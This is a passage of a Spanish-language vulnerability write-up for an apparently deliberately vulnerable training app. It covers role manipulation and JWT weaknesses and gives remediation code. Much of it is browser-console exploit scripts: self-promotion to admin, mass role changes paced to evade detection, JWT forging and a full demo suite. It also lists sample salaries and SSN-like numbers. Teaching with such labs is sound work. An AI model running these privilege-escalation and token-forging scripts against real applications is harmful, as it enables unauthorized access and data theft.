        memory_usage: 'normal'
      },
      // Secrets y configuraci√≥n sensible NUNCA incluidos
    };
  }
  
  return baseInfo;
};
```

---

## 5. Manipulaci√≥n de Roles y Permisos

### üìù **Descripci√≥n**

La funci√≥n `updateUserRole()` permite a cualquier usuario cambiar los roles de otros usuarios, incluyendo auto-promoci√≥n a administrador.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: `updateUserRole()` en `services/api.ts` (l√≠neas 225-255)
- **Frontend UI**: Select dropdown en AdminPanel.tsx

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
export const updateUserRole = async (id: number, role: string): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // üö® NO HAY VALIDACI√ìN: Cualquier usuario puede cambiar roles
  const oldRole = usersDatabase[userIndex].role;
  usersDatabase[userIndex].role = role;
  
  console.log(`üö® VULNERABILITY EXPLOITED: User ${decoded.username} changed user ${id} role from ${oldRole} to ${role}`);
  
  // Si el usuario cambi√≥ su propio rol, actualizar el token en localStorage
  if (id === decoded.id) {
    const updatedUser = { ...usersDatabase[userIndex] };
    delete (updatedUser as any).password;
    const newToken = createSimpleJWT(updatedUser);
    localStorage.setItem('token', newToken);
    localStorage.setItem('user', JSON.stringify(updatedUser));
  }
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Auto-promoci√≥n a Admin**
```javascript
// M√âTODO PR√ÅCTICO: Auto-promoci√≥n usando acceso directo
const promoteToAdmin = () => {
  if (!window.debugAPI || !window.debugAPI.usersDatabase) {
    console.log("‚ùå debugAPI no disponible. M√©todos alternativos:");
    console.log("   1. Usar formularios de la UI en /admin");
    console.log("   2. Interceptar y modificar requests de red");
    console.log("   3. Buscar endpoints de API expuestos");
    return;
  }
  
  const currentUserData = JSON.parse(localStorage.getItem('user') || '{}');
  console.log(`üö® Intentando auto-promoci√≥n para: ${currentUserData.username} (ID: ${currentUserData.id})`);
  
  const users = window.debugAPI.usersDatabase;
  const userToPromote = users.find(u => u.id === currentUserData.id);
  
  if (userToPromote) {
    const oldRole = userToPromote.role;
    
    // Realizar auto-promoci√≥n
    userToPromote.role = 'admin';
    
    console.log(`‚úÖ AUTO-PROMOCI√ìN EXITOSA:`);
    console.log(`   Usuario: ${userToPromote.username}`);
    console.log(`   Rol anterior: ${oldRole}`);
    console.log(`   Rol nuevo: ${userToPromote.role}`);
    
    // Actualizar datos en localStorage
    const updatedUserData = { ...currentUserData, role: 'admin' };
    localStorage.setItem('user', JSON.stringify(updatedUserData));
    
    // Crear nuevo token con rol actualizado (usando la secret conocida)
    const secret = window.debugAPI.SYSTEM_CONFIG?.jwt_secret || 'vulnerable-secret-key';
    const newPayload = {
      ...currentUserData,
      role: 'admin',
      iat: Math.floor(Date.now() / 1000),
      exp: Math.floor(Date.now() / 1000) + (24 * 60 * 60)
    };
    
    const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
    const payload = btoa(JSON.stringify(newPayload));
    const signature = btoa(`signature_with_${secret}`);
    const newToken = `${header}.${payload}.${signature}`;
    
    localStorage.setItem('token', newToken);
    
    console.log("üîÑ Token actualizado con nuevos privilegios");
    console.log("‚úÖ Recarga la p√°gina para usar privilegios de admin");
    
  } else {
    console.log("‚ùå Usuario no encontrado en base de datos");
  }
};

// Ejecutar auto-promoci√≥n
promoteToAdmin();
```

#### **M√©todo 2: Ataque Masivo de Promoci√≥n**
```javascript
// Script para convertir todos los usuarios en admins
const promoteAllUsers = async () => {
  console.log("üö® INICIANDO ATAQUE MASIVO DE PROMOCI√ìN");
  
  const results = [];
  
  for (let userId = 1; userId <= 4; userId++) {
    try {
      await api.updateUserRole(userId, 'admin');
      results.push({ userId, status: 'success', message: 'Promoted to admin' });
      console.log(`‚úÖ Usuario ${userId} promovido a admin`);
    } catch (error) {
      results.push({ userId, status: 'failed', message: error.message });
      console.log(`‚ùå Fall√≥ promover usuario ${userId}: ${error.message}`);
    }
  }
  
  console.log("üìä RESULTADOS DEL ATAQUE:");
  console.table(results);
  
  return results;
};

// Ejecutar ataque masivo
promoteAllUsers();
```

#### **M√©todo 3: Manipulaci√≥n Estrat√©gica de Roles**
```javascript
// Script m√°s sofisticado para manipular roles estrat√©gicamente
const strategicRoleManipulation = async () => {
  const currentUser = api.decodeCurrentToken();
  console.log(`üéØ Iniciando manipulaci√≥n estrat√©gica desde: ${currentUser?.username}`);
  
  const strategy = [
    { id: 1, role: 'user', reason: 'Degradar admin original' },
    { id: currentUser.id, role: 'admin', reason: 'Auto-promoci√≥n' },
    { id: 3, role: 'admin', reason: 'Crear aliado admin' },
    { id: 4, role: 'user', reason: 'Mantener como usuario normal' }
  ];
  
  console.log("üìã ESTRATEGIA DE ATAQUE:");
  console.table(strategy);
  
  for (const action of strategy) {
    try {
      await api.updateUserRole(action.id, action.role);
      console.log(`‚úÖ ${action.reason}: Usuario ${action.id} ‚Üí ${action.role}`);
      
      // Pausa entre cambios para evitar detecci√≥n
      await new Promise(resolve => setTimeout(resolve, 500));
      
    } catch (error) {
      console.log(`‚ùå Fall√≥ ${action.reason}: ${error.message}`);
    }
  }
  
  console.log("üèÅ Manipulaci√≥n estrat√©gica completada");
  console.log("üîÑ Recarga la p√°gina si cambiaste tu propio rol");
};

// Ejecutar manipulaci√≥n estrat√©gica
strategicRoleManipulation();
```

### üõ°Ô∏è **Contramedidas**

#### **1. Validaci√≥n Estricta de Permisos**
```javascript
export const updateUserRole = async (id: number, role: string): Promise<void> => {
  await simulateNetworkDelay();
  
  const token = localStorage.getItem('token');
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }

  const decoded = decodeSimpleJWT(token);
  if (!decoded) {
    throw createHttpError(403, 'Token inv√°lido');
  }

  // ‚úÖ Solo admins pueden cambiar roles
  if (decoded.role !== 'admin') {
    throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
  }

  // ‚úÖ Validar rol v√°lido
  const validRoles = ['user', 'admin'];
  if (!validRoles.includes(role)) {
    throw createHttpError(400, 'Rol inv√°lido');
  }

  const userIndex = usersDatabase.findIndex(u => u.id === id);
  
  if (userIndex === -1) {
    throw createHttpError(404, 'Usuario no encontrado');
  }

  // ‚úÖ Prevenir degradaci√≥n del √∫ltimo admin
  if (usersDatabase[userIndex].role === 'admin' && role !== 'admin') {
    const adminCount = usersDatabase.filter(u => u.role === 'admin').length;
    if (adminCount <= 1) {
      throw createHttpError(400, 'No puedes degradar el √∫ltimo administrador');
    }
  }

  const oldRole = usersDatabase[userIndex].role;
  usersDatabase[userIndex].role = role;
  
  console.log(`‚úÖ Admin ${decoded.username} changed user ${id} role from ${oldRole} to ${role}`);
  
  // Log del cambio cr√≠tico
  if (role === 'admin') {
    console.warn(`üö® CRITICAL: New admin created by ${decoded.username}`);
  }
};
```

#### **2. Sistema de Auditor√≠a para Cambios de Roles**
```javascript
const roleChangeAudit: any[] = [];

const auditRoleChange = (admin: any, targetId: number, oldRole: string, newRole: string) => {
  const auditEntry = {
    timestamp: new Date().toISOString(),
    action: 'role_change',
    admin_user: {
      id: admin.id,
      username: admin.username
    },
    target_user: targetId,
    role_change: {
      from: oldRole,
      to: newRole
    },
    severity: newRole === 'admin' ? 'HIGH' : 'MEDIUM',
    requires_review: newRole === 'admin'
  };
  
  roleChangeAudit.push(auditEntry);
  
  // Alertas para cambios cr√≠ticos
  if (newRole === 'admin') {
    console.warn('üö® CRITICAL ROLE CHANGE AUDIT:', auditEntry);
  }
  
  return auditEntry;
};

// Funci√≥n para revisar auditor√≠a
export const getRoleChangeAudit = () => {
  return roleChangeAudit.filter(entry => entry.requires_review);
};
```

---

## 6. Vulnerabilidades en JWT

### üìù **Descripci√≥n**

El sistema de JWT presenta m√∫ltiples vulnerabilidades: secret key expuesta, almacenamiento inseguro en localStorage, y falta de invalidaci√≥n de tokens.

### üéØ **Ubicaci√≥n en la Aplicaci√≥n**

- **Frontend API**: JWT functions en `services/api.ts` (l√≠neas 35-75)
- **Configuraci√≥n**: `SYSTEM_CONFIG` con secret expuesta (l√≠nea 20)

### üîç **C√≥digo Vulnerable**

```javascript
// services/api.ts
const SYSTEM_CONFIG = {
  jwt_secret: 'vulnerable-secret-key', // üö® Secret hardcodeada y d√©bil
  // ... otros configs
};

// üö® Funci√≥n que crea JWT con secret expuesta
const createSimpleJWT = (user: Omit<User, 'password'>) => {
  const header = btoa(JSON.stringify({ alg: 'HS256', typ: 'JWT' }));
  const payload = btoa(JSON.stringify({
    id: user.id,
    username: user.username,
    email: user.email,
    role: user.role,
    iat: Math.floor(Date.now() / 1000),
    exp: Math.floor(Date.now() / 1000) + (24 * 60 * 60) // 24 horas
  }));
  const signature = btoa(`signature_with_${SYSTEM_CONFIG.jwt_secret}`);
  
  return `${header}.${payload}.${signature}`;
};

// Login que almacena en localStorage (vulnerable)
export const loginUser = async (username: string, password: string): Promise<LoginResponse> => {
  // ... validaci√≥n
  const token = createSimpleJWT(userWithoutPassword);
  
  // üö® Almacena en localStorage (vulnerable a XSS)
  return {
    token,
    user: userWithoutPassword
  };
};
```

### üí• **Formas de Explotaci√≥n**

#### **M√©todo 1: Extracci√≥n de JWT Secret**
```javascript
// 1. Obtener la secret del sistema
api.getSystemInfo().then(info => {
  console.log("üîë JWT Secret obtenida:", info.secret_key);
  
  // 2. Analizar token actual
  const currentToken = localStorage.getItem('token');
  console.log("üé´ Token actual:", currentToken);
  
  // 3. Decodificar token actual
  const decoded = api.decodeCurrentToken();
  console.log("üìã Datos del token:", decoded);
  
  // Ahora tenemos todo lo necesario para forjar tokens
  (window as any).jwtExploitData = {
    secret: info.secret_key,
    currentToken,
    decodedToken: decoded
  };
}).catch(err => console.log("Error:", err.message));
```

#### **M√©todo 2: Forjado de Token de Super-Admin**
```javascript
// Crear token completamente falso con privilegios m√°ximos
const forgeAdminToken = () => {
  const fakeAdminData = {
    id: 9999,
    username: 'super_admin',
    email: 'superadmin@hacked.com',
    role: 'admin',
    created_at: new Date().toISOString(),
    profile: {
      fullName: 'Super Administrator (FORGED)',
      department: 'Security Breach',
      salary: 999999,
      phone: '+1-555-HACKED'
    }
  };
  
  console.log("üö® FORGING SUPER ADMIN TOKEN...");
  
  // Usar la funci√≥n expuesta del sistema
  const forgedToken = api.createFakeToken(fakeAdminData);
  
  console.log("‚úÖ Token forjado creado:", forgedToken);
  
  // Reemplazar token y datos de usuario
  localStorage.setItem('token', forgedToken);
  localStorage.setItem('user', JSON.stringify(fakeAdminData));
  
  console.log("üé≠ Identidad falsa establecida. Recarga la p√°gina.");
  console.log("üîì Ahora tienes acceso administrativo completo con identidad forjada.");
  
  return forgedToken;
};

// Ejecutar forjado
forgeAdminToken();
```

#### **M√©todo 3: An√°lisis y Manipulaci√≥n de Token**
```javascript
// Script completo para an√°lisis y manipulaci√≥n de JWT
const jwtExploitSuite = {
  
  // Analizar token actual
  analyzeCurrentToken: () => {
    const token = localStorage.getItem('token');
    if (!token) {
      console.log("‚ùå No hay token disponible");
      return null;
    }
    
    const parts = token.split('.');
    if (parts.length !== 3) {
      console.log("‚ùå Token malformado");
      return null;
    }
    
    try {
      const header = JSON.parse(atob(parts[0]));
      const payload = JSON.parse(atob(parts[1]));
      const signature = parts[2];
      
      const analysis = {
        header,
        payload,
        signature,
        isExpired: payload.exp < Math.floor(Date.now() / 1000),
        timeToExpiry: payload.exp - Math.floor(Date.now() / 1000),
        algorithm: header.alg,
        tokenType: header.typ
      };
      
      console.log("üîç AN√ÅLISIS DE TOKEN ACTUAL:");
      console.table(analysis);
      
      return analysis;
    } catch (error) {
      console.log("‚ùå Error analizando token:", error.message);
      return null;
    }
  },
  
  // Crear m√∫ltiples tokens falsos
  createMultipleFakeTokens: () => {
    const fakeUsers = [
      { id: 1001, username: 'fake_admin_1', role: 'admin' },
      { id: 1002, username: 'fake_admin_2', role: 'admin' },
      { id: 1003, username: 'backdoor_user', role: 'admin' }
    ];
    
    const forgedTokens = fakeUsers.map(user => {
      const userData = {
        ...user,
        email: `${user.username}@forged.com`,
        created_at: new Date().toISOString(),
        profile: {
          fullName: `Forged User ${user.id}`,
          department: 'Hacking Department'
        }
      };
      
      return {
        user: userData,
        token: api.createFakeToken(userData)
      };
    });
    
    console.log("üé≠ TOKENS FORJADOS CREADOS:");
    console.table(forgedTokens);
    
    // Guardar para uso posterior
    (window as any).forgedTokens = forgedTokens;
    
    return forgedTokens;
  },
  
  // Rotar entre tokens forjados
  switchToFakeToken: (index = 0) => {
    const forgedTokens = (window as any).forgedTokens;
    if (!forgedTokens || !forgedTokens[index]) {
      console.log("‚ùå Token forjado no disponible. Ejecuta createMultipleFakeTokens() primero.");
      return;
    }
    
    const selectedToken = forgedTokens[index];
    localStorage.setItem('token', selectedToken.token);
    localStorage.setItem('user', JSON.stringify(selectedToken.user));
    
    console.log(`üîÑ Cambiado a identidad forjada: ${selectedToken.user.username}`);
    console.log("üîÑ Recarga la p√°gina para usar la nueva identidad.");
  }
};

// Ejecutar suite completo
console.log("üö® INICIANDO JWT EXPLOIT SUITE");
jwtExploitSuite.analyzeCurrentToken();
jwtExploitSuite.createMultipleFakeTokens();

// Para usar: jwtExploitSuite.switchToFakeToken(0);
```

### üõ°Ô∏è **Contramedidas**

#### **1. Gesti√≥n Segura de Secretos**
```javascript
// Configuraci√≥n segura de JWT
const JWT_CONFIG = {
  secret: process.env.JWT_SECRET || generateRandomSecret(),
  algorithm: 'HS256',
  accessTokenExpiry: '15m',
  refreshTokenExpiry: '7d'
};

// Generar secret aleatoria si no est√° en entorno
const generateRandomSecret = () => {
  if (typeof crypto !== 'undefined' && crypto.getRandomValues) {
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    return Array.from(array, byte => byte.toString(16).padStart(2, '0')).join('');
  }
  throw new Error('No secure random generator available');
};

// ‚úÖ NUNCA exponer secret en respuestas
export const getSystemInfo = async (): Promise<SystemInfo> => {
  // ... validaciones
  
  return {
    server: 'Application Server',
    database: 'JSON Storage',
    users_count: usersDatabase.length,
    version: '1.0.0',
    // ‚ùå NUNCA incluir: jwt_secret, private_keys, passwords
  };
};
```

#### **2. Almacenamiento Seguro (Simulaci√≥n de HttpOnly)**
```javascript
// Simulaci√≥n de almacenamiento seguro para el frontend
class SecureTokenManager {
  private static instance: SecureTokenManager;
  private tokenStore: Map<string, any> = new Map();
  
  static getInstance(): SecureTokenManager {
    if (!SecureTokenManager.instance) {
      SecureTokenManager.instance = new SecureTokenManager();
    }
    return SecureTokenManager.instance;
  }
  
  // ‚úÖ Almacenar token de forma m√°s segura
  setToken(token: string, userData: any): void {
    // En una implementaci√≥n real, esto ser√≠a una HttpOnly cookie
    this.tokenStore.set('access_token', {
      token,
      userData,
      expires: Date.now() + (15 * 60 * 1000), // 15 minutos
      created: Date.now()
    });
    
    // Limpiar localStorage de tokens
    localStorage.removeItem('token');
    
    console.log("‚úÖ Token almacenado de forma segura");
  }
  
  getToken(): string | null {
    const tokenData = this.tokenStore.get('access_token');
    
    if (!tokenData) return null;
    
    // Verificar expiraci√≥n
    if (Date.now() > tokenData.expires) {
      this.clearToken();
      return null;
    }
    
    return tokenData.token;
  }
  
  clearToken(): void {
    this.tokenStore.delete('access_token');
    localStorage.removeItem('token');
    localStorage.removeItem('user');
    console.log("‚úÖ Token limpiado de forma segura");
  }
  
  getUserData(): any {
    const tokenData = this.tokenStore.get('access_token');
    return tokenData?.userData || null;
  }
}

// Uso en login
export const loginUser = async (username: string, password: string): Promise<LoginResponse> => {
  // ... validaci√≥n de credenciales
  
  const token = createSecureJWT(userWithoutPassword);
  
  // ‚úÖ Usar almacenamiento seguro
  const tokenManager = SecureTokenManager.getInstance();
  tokenManager.setToken(token, userWithoutPassword);
  
  return {
    token: 'stored_securely', // No devolver token real
    user: userWithoutPassword
  };
};
```

#### **3. Validaci√≥n y Blacklist de Tokens**
```javascript
// Sistema de invalidaci√≥n de tokens
const tokenBlacklist = new Set<string>();

const blacklistToken = (token: string): void => {
  tokenBlacklist.add(token);
  console.log("üö´ Token a√±adido a blacklist");
};

const isTokenBlacklisted = (token: string): boolean => {
  return tokenBlacklist.has(token);
};

// Validaci√≥n mejorada de tokens
const validateToken = (token: string): any => {
  if (!token) {
    throw createHttpError(401, 'Token requerido');
  }
  
  // ‚úÖ Verificar blacklist
  if (isTokenBlacklisted(token)) {
    throw createHttpError(401, 'Token invalidado');
  }
  
  try {
    const decoded = decodeSimpleJWT(token);
    
    if (!decoded) {
      throw createHttpError(403, 'Token inv√°lido');
    }
    
    // ‚úÖ Verificar que el usuario a√∫n existe y tiene el mismo rol
    const user = usersDatabase.find(u => u.id === decoded.id);
    if (!user || user.role !== decoded.role) {
      blacklistToken(token);
      throw createHttpError(401, 'Token inv√°lido: usuario modificado');
    }
    
    return decoded;
  } catch (error) {
    throw createHttpError(403, 'Token inv√°lido');
  }
};

// Logout con invalidaci√≥n
export const logoutUser = async (): Promise<void> => {
  const token = localStorage.getItem('token');
  if (token) {
    blacklistToken(token);
  }
  
  // Limpiar almacenamiento
  localStorage.removeItem('token');
  localStorage.removeItem('user');
  
  console.log("‚úÖ Logout exitoso - Token invalidado");
};
```

---

## üìä Resumen Ejecutivo de Vulnerabilidades

### **Matriz de Riesgo Actualizada**

| Vulnerabilidad | Severidad | Facilidad de Explotaci√≥n | Impacto | Funci√≥n Afectada |
|---|---|---|---|---|
| IDOR | **Alta** | Muy F√°cil | Acceso a datos personales | `getUserById()` |
| Escalada Horizontal | **Alta** | Muy F√°cil | Modificaci√≥n de datos ajenos | `updateUser()` |
| Escalada Vertical | **Cr√≠tica** | Muy F√°cil | Acceso administrativo completo | `getAllUsers()` |
| Exposici√≥n de Datos | **Cr√≠tica** | Muy F√°cil | Comprometimiento del sistema | `getSystemInfo()` |
| Manipulaci√≥n de Roles | **Cr√≠tica** | Muy F√°cil | Control total de la aplicaci√≥n | `updateUserRole()` |
| JWT Vulnerabilidades | **Cr√≠tica** | F√°cil | Forjado de identidades | JWT functions |

### **Datos Espec√≠ficos Comprometidos en el CFT**

#### **Informaci√≥n Personal Expuesta:**
- **Juan Aranguiz Salas**: Salario $65,000, SSN 987-65-4321, Tel +56932123422
- **James Blond Von Gonzalez**: Salario $70,000, SSN 456-78-9012, Tel +56973751234  
- **Rob Spon Ja**: Salario $60,000, SSN 789-01-2345, Tel +56943848472
- **Administrador**: Salario $120,000, SSN 123-45-6789, Tel +5696610323

#### **Configuraci√≥n del Sistema Expuesta:**
- **JWT Secret**: `vulnerable-secret-key`
- **Informaci√≥n del servidor**: Ubuntu 20.04
- **Base de datos**: JSON Local Storage
- **Modo debug**: Habilitado
- **Lista de admins**: ['admin']

---

## üõ°Ô∏è Plan de Remediaci√≥n Espec√≠fico para CFT

### **Fase 1: Cr√≠tico (Implementar Inmediatamente)**

#### **1. Validaci√≥n de Ownership en `getUserById()`**
```javascript
// Implementar verificaci√≥n de propietario
if (id !== decoded.id && decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: No puedes acceder a este perfil');
}
```

#### **2. Protecci√≥n de `getSystemInfo()`**
```javascript
// Eliminar completamente la exposici√≥n de JWT secret
// Implementar verificaci√≥n de rol de admin
if (decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
}
```

#### **3. Validaci√≥n en `updateUserRole()`**
```javascript
// Solo admins pueden cambiar roles
if (decoded.role !== 'admin') {
  throw createHttpError(403, 'Acceso denegado: Se requieren privilegios de administrador');
}
```

### **Fase 2: Alto (Implementar en 1-2 semanas)**

#### **4. Protecci√≥n de `getAllUsers()` y `updateUser()`**
- Agregar verificaci√≥n de rol/ownership en todas las funciones administrativas
- Implementar logging de eventos de seguridad

#### **5. Mejora del Sistema JWT**
- Implementar almacenamiento m√°s seguro (simulaci√≥n de HttpOnly cookies)
- Sistema de blacklist de tokens
- Secret keys generadas aleatoriamente

### **Fase 3: Medio (Implementar en 1 mes)**

#### **6. Hardening General**
- Rate limiting simulado
- Auditor√≠a completa de acciones
- Validaci√≥n de entrada mejorada

---

## üéì Scripts de Demostraci√≥n para CFT

### **Script de Demostraci√≥n Completa**
```javascript
// DEMO COMPLETO - Ejecutar en DevTools Console
const CFTVulnerabilityDemo = {
  
  async runCompleteDemo() {
    console.log("üö® INICIANDO DEMOSTRACI√ìN COMPLETA DE VULNERABILIDADES CFT");
    console.log("‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê");
    
    // 1. IDOR Demo
    await this.demonstrateIDOR();
    
    // 2. Escalada Horizontal
    await this.demonstrateHorizontalEscalation();
    
    // 3. Escalada Vertical  
    await this.demonstrateVerticalEscalation();
    
    // 4. Exposici√≥n de datos
    await this.demonstrateDataExposure();
    
    // 5. Manipulaci√≥n de roles
    await this.demonstrateRoleManipulation();
    
    // 6. JWT Exploitation
    await this.demonstrateJWTExploitation();
    
    console.log("‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê");
    console.log("üèÅ DEMOSTRACI√ìN COMPLETA FINALIZADA");
  },
  
  async demonstrateIDOR() {
    console.log("\nüîç 1. DEMOSTRANDO IDOR (Insecure Direct Object Reference)");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    console.log(`üë§ Usuario actual: ${currentUser?.username} (ID: ${currentUser?.id})`);
    
    for (let i = 1; i <= 4; i++) {
      try {
        const user = await api.getUserById(i);
        console.log(`‚úÖ Acceso exitoso a usuario ${i}: ${user.profile?.fullName} - Salario: $${user.profile?.salary}`);
      } catch (error) {
        console.log(`‚ùå Error accediendo a usuario ${i}: ${error.message}`);
      }
    }
  },
  
  async demonstrateHorizontalEscalation() {
    console.log("\n‚ÜîÔ∏è 2. DEMOSTRANDO ESCALADA HORIZONTAL");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    const targetId = currentUser?.id === 2 ? 3 : 2; // Atacar a otro usuario
    
    try {
      const originalUser = await api.getUserById(targetId);
      console.log(`üéØ Usuario objetivo: ${originalUser.profile?.fullName}`);
      
      await api.updateUser(targetId, {
        fullName: "HACKEADO POR " + currentUser?.username,
        department: "DEPARTAMENTO COMPROMETIDO"
      });
      
      const modifiedUser = await api.getUserById(targetId);
      console.log(`‚úÖ Usuario modificado exitosamente: ${modifiedUser.profile?.fullName}`);
      
    } catch (error) {
      console.log(`‚ùå Error en escalada horizontal: ${error.message}`);
    }
  },
  
  async demonstrateVerticalEscalation() {
    console.log("\n‚¨ÜÔ∏è 3. DEMOSTRANDO ESCALADA VERTICAL");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    console.log(`üë§ Intentando acceso admin desde: ${currentUser?.username} (Rol: ${currentUser?.role})`);
    
    try {
      const allUsers = await api.getAllUsers();
      console.log(`‚úÖ ¬°ACCESO ADMINISTRATIVO EXITOSO! Obtenidos ${allUsers.length} usuarios:`);
      
      allUsers.forEach(user => {
        console.log(`   üìã ${user.username} (${user.role}) - $${user.profile?.salary} - SSN: ${user.profile?.ssn}`);
      });
      
    } catch (error) {
      console.log(`‚ùå Error en escalada vertical: ${error.message}`);
    }
  },
  
  async demonstrateDataExposure() {
    console.log("\nüîì 4. DEMOSTRANDO EXPOSICI√ìN DE DATOS SENSIBLES");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    try {
      const systemInfo = await api.getSystemInfo();
      console.log("‚úÖ ¬°INFORMACI√ìN CR√çTICA DEL SISTEMA OBTENIDA!");
      console.log(`   üîë JWT Secret: ${systemInfo.secret_key}`);
      console.log(`   üñ•Ô∏è Servidor: ${systemInfo.server}`);
      console.log(`   üë• Admin users: ${systemInfo.admin_users?.join(', ')}`);
      console.log(`   üêõ Debug mode: ${systemInfo.debug_mode}`);
      
    } catch (error) {
      console.log(`‚ùå Error obteniendo system info: ${error.message}`);
    }
  },
  
  async demonstrateRoleManipulation() {
    console.log("\nüëë 5. DEMOSTRANDO MANIPULACI√ìN DE ROLES");
    console.log("‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ");
    
    const currentUser = api.decodeCurrentToken();
    
    if (currentUser?.role !== 'admin') {
      try {
        console.log(`üöÄ Intentando auto-promoci√≥n a admin para: ${currentUser?.username}`);
        await api.updateUserRole(currentUser.id, 'admin');
        console.log("‚úÖ ¬°AUTO-PROMOCI√ìN EXITOSA! Recarga la p√°gina para usar privilegios de admin.");
        
      } catch (error) {
        console.log(`‚ùå Error en auto-promoci√≥n: ${error.message}`);
      }
    } else {
      console.log("üëë Ya eres admin - probando promoci√≥n de otros usuarios");
      
      try {
        await api.updateUserRole(2, 'admin');
        console.log("‚úÖ Usuario 2 promovido a admin");
      } catch (error) {
        console.log(`‚ùå Error promoviendo usuario: ${error.message}`);
      }
    }
